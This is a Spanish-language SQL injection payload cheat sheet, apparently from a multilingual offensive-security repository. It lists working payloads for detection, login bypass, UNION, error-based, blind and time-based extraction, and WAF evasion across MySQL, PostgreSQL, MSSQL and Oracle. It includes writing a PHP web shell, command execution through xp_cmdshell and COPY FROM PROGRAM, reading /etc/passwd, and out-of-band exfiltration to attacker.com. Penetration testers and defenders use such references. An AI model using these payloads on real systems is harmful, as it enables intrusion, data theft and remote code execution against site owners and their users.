# 💉 Payloads de inyección SQL

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](SQLi.tr.md) • [🇬🇷 Ελληνικά](SQLi.el.md)

```
  ███████╗ ██████╗ ██╗     ██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██╔════╝██╔═══██╗██║     ██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ███████╗██║   ██║██║     ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ╚════██║██║▄▄ ██║██║     ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████║╚██████╔╝███████╗██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

---

## 📋 Índice

- [Payloads de detección](#-payloads-de-detección)
- [Evasión de autenticación](#-evasión-de-autenticación)
- [Inyección basada en UNION](#-inyección-basada-en-union)
- [Inyección basada en errores](#-inyección-basada-en-errores)
- [Inyección SQL ciega](#-inyección-sql-ciega)
- [Inyección basada en tiempo](#-inyección-basada-en-tiempo)
- [Específicos de cada gestor de bases de datos (DBMS)](#-específicos-de-cada-gestor-de-bases-de-datos-dbms)
- [Evasión de WAF](#-evasión-de-waf)
- [Fuera de banda (OOB)](#-fuera-de-banda-oob)

---

## 🔍 Payloads de detección

> **Dependencia del contexto:** las funciones, el número de columnas, los tipos, los permisos y la sintaxis cambian entre gestores y versiones. Algunas líneas son esquemas parciales; los textos entre puntos suspensivos no son consultas ejecutables. En MySQL, el comentario `--` requiere un espacio o carácter de control posterior; se conservan todos los payloads originales, incluidos los que omiten esa condición.

### Detección básica

```sql
'
"
`
')
")
`)
'))
"))
`))

-- comment
/* comment */
# comment (MySQL)
```

### Detección booleana

```sql
' OR '1'='1
' OR '1'='1' --
' OR 1=1 --
" OR "1"="1
" OR 1=1 --
' OR 'x'='x
' OR ''='
') OR ('1'='1
') OR ('x'='x
1' OR '1'='1
1" OR "1"="1
```

### Detección aritmética

```sql
' OR 1=1--
' OR 1=2--
' AND 1=1--
' AND 1=2--
1 OR 1=1
1 AND 1=1
1 AND 1=2
```

### Concatenación de cadenas

```sql
' || 'test
' + 'test
' 'test
```

---

## 🔓 Evasión de autenticación

### Evasión del inicio de sesión

```sql
admin' --
admin' #
admin'/*
' OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR '1'='1--
') OR ('1'='1--
' OR ''='
' OR 1=1-- -
```

### Campo de usuario

```sql
admin'--
admin' OR '1'='1
admin' OR '1'='1'--
admin' OR '1'='1'/*
admin' OR 1=1--
admin'/*
```

### Campo de contraseña

```sql
' OR '1'='1
' OR ''='
' OR 1=1--
anything' OR '1'='1
```

### Combinaciones habituales de evasión

```sql
Username: admin'--
Password: anything

Username: ' OR 1=1--
Password: anything

Username: admin
Password: ' OR '1'='1

Username: ' OR '1'='1' --
Password: ' OR '1'='1' --
```

---

## 🔗 Inyección basada en UNION

### Determinar el número de columnas

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...continuar hasta que se produzca un error...

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### UNION básico

```sql
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3,4--
```

### Extracción de datos

```sql
-- MySQL
' UNION SELECT user(),database()--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--

-- PostgreSQL
' UNION SELECT current_user,version()--
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- MSSQL
' UNION SELECT @@version,NULL--
' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--

-- Oracle
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT table_name,NULL FROM all_tables--
```

### UNION con comentarios

```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,2,3#
' UNION SELECT 1,2,3/*
' UNION SELECT 1,2,3;%00
```

---

<a id="-inyección-basada-en-errores"></a>
## ⚠️ Inyección basada en errores

### Basada en errores de MySQL

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--

' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--

' AND EXP(~(SELECT * FROM (SELECT version())x))--
```

### Basada en errores de MSSQL

```sql
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

' AND 1=(SELECT TOP 1 CAST(username AS int) FROM users)--
```

### Basada en errores de PostgreSQL

```sql
' AND 1=CAST((SELECT version()) AS int)--

' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
```

### Basada en errores de Oracle

```sql
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))--

' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
```

---

## 🔮 Inyección SQL ciega

### Ciega basada en condiciones booleanas

```sql
-- Condición verdadera
' AND 1=1--
' AND 'a'='a'--

-- Condición falsa
' AND 1=2--
' AND 'a'='b'--

-- Extracción de caracteres
' AND SUBSTRING(username,1,1)='a'--
' AND SUBSTRING((SELECT database()),1,1)='t'--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100--
```

### Búsqueda binaria

```sql
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>96--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>112--
...reducir el intervalo hasta identificar el carácter exacto...
```

### Detección de longitud

```sql
' AND LENGTH(database())>1--
' AND LENGTH(database())>5--
' AND LENGTH(database())=7--
```

### Enumeración de tablas y columnas

```sql
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5--

' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u'--
```

---

<a id="-inyección-basada-en-tiempo"></a>
## ⏱️ Inyección basada en tiempo

### MySQL

```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
' AND BENCHMARK(10000000,SHA1('test'))--

1' AND (SELECT SLEEP(5) FROM dual WHERE database() LIKE 't%')--
```

### PostgreSQL

```sql
'; SELECT pg_sleep(5)--
' AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 1 END)--
' || pg_sleep(5)--
```

### MSSQL

```sql
'; WAITFOR DELAY '0:0:5'--
' AND 1=1 WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

### Oracle

```sql
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' AND 1=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END)--
```

---

<a id="-específicos-de-cada-gestor-de-bases-de-datos-dbms"></a>
## 🗄️ Específicos de cada gestor de bases de datos (DBMS)

### Payloads MySQL

```sql
-- Versión
' UNION SELECT @@version--
' UNION SELECT version()--

-- Usuario actual
' UNION SELECT user()--
' UNION SELECT current_user()--

-- Base de datos
' UNION SELECT database()--

-- Tablas
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--

-- Columnas
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

-- Leer un archivo
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- Escribir un archivo
' UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'--
```

### Payloads PostgreSQL

```sql
-- Versión
' UNION SELECT version()--

-- Usuario actual
' UNION SELECT current_user--

-- Base de datos
' UNION SELECT current_database()--

-- Tablas
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--

-- Leer un archivo
' UNION SELECT pg_read_file('/etc/passwd')--

-- Ejecución de comandos
'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';--
```

### Payloads MSSQL

```sql
-- Versión
' UNION SELECT @@version--

-- Usuario actual
' UNION SELECT SYSTEM_USER--

-- Base de datos
' UNION SELECT DB_NAME()--

-- Tablas
' UNION SELECT name FROM sysobjects WHERE xtype='U'--

-- Ejecución de comandos
'; EXEC xp_cmdshell 'whoami';--

-- Habilitar xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

### Payloads Oracle

```sql
-- Versión
' UNION SELECT banner FROM v$version WHERE rownum=1--

-- Usuario actual
' UNION SELECT user FROM dual--

-- Base de datos
' UNION SELECT ora_database_name FROM dual--

-- Tablas
' UNION SELECT table_name FROM all_tables--

-- Columnas
' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--
```

---

<a id="-evasión-de-waf"></a>
## 🛡️ Evasión de WAF

### Evasión de filtros de espacios

```sql
'/**/OR/**/1=1--
' OR/**/1=1--
'%09OR%091=1--
'%0AOR%0A1=1--
'%0COR%0C1=1--
'%0DOR%0D1=1--
'+OR+1=1--
```

### Evasión mediante comentarios

```sql
/*!50000SELECT*/ * FROM users
SELECT/**_**/ * FROM users
SELECT%0a* FROM users
```

### Variaciones de mayúsculas y minúsculas

```sql
' uNiOn SeLeCt 1,2,3--
' UnIoN sElEcT 1,2,3--
```

### Codificación

```sql
-- Codificación URL
%27%20OR%201=1--
%27%20UNION%20SELECT%201,2,3--

-- Codificación URL doble
%2527%20OR%201=1--

-- Codificación hexadecimal
' UNION SELECT 0x61646d696e--  (admin in hex)
```

### Evasión de filtros de palabras clave

```sql
-- Evasión mediante UNION
' UNION ALL SELECT
' /*!UNION*/ SELECT
' UN/**/ION SE/**/LECT

-- Evasión mediante SELECT
' UNION SEL/**/ECT
' UNION%0ASELECT
' UNION(SELECT)

-- Evasión mediante AND/OR
' && 1=1--
' || 1=1--
' %26%26 1=1--
' -1 || 1=1--
```

### HPP (HTTP Parameter Pollution: contaminación de parámetros HTTP)

```
?id=1&id=' OR '1'='1
?id=1/*&id=*/' OR '1'='1
```

---

## 📡 Fuera de banda (OOB)

### MySQL OOB

```sql
SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))
SELECT * INTO OUTFILE '\\\\attacker.com\\share\\output.txt'
```

### MSSQL OOB

```sql
'; EXEC master..xp_dirtree '\\attacker.com\share'--
'; EXEC master..xp_fileexist '\\attacker.com\share'--
```

### PostgreSQL OOB

```sql
CREATE EXTENSION dblink; SELECT dblink_connect('host=attacker.com user=test password=test dbname=test')
```

### Oracle OOB

```sql
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||version) FROM dual
SELECT HTTPURITYPE('http://attacker.com/'||version).GETCLOB() FROM dual
```

---

## 📊 Referencia rápida

### Orden de detección

1. `'` - Comilla simple
2. `"` - Comilla doble
3. `' OR '1'='1` - Inyección booleana
4. `' AND SLEEP(5)--` - Basada en tiempo
5. `' UNION SELECT NULL--` - Basada en UNION

### Endpoints habituales

```
- Formularios de acceso
- Campos de búsqueda
- ID de usuarios en URL
- Valores de cookies
- Cabeceras HTTP (User-Agent, Referer)
- Parámetros de API
```

### Comentarios SQL por gestor de bases de datos

| DBMS | Comentarios |
|------|----------|
| MySQL | `-- `, `#`, `/* */` |
| PostgreSQL | `-- `, `/* */` |
| MSSQL | `-- `, `/* */` |
| Oracle | `-- `, `/* */` |

---

## 📚 Recursos

- [Inyección SQL de PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

<p align="center">
  <b>💉 Arsenal de inyección SQL</b><br>
  <i>¡Solo con fines educativos!</i>
</p>
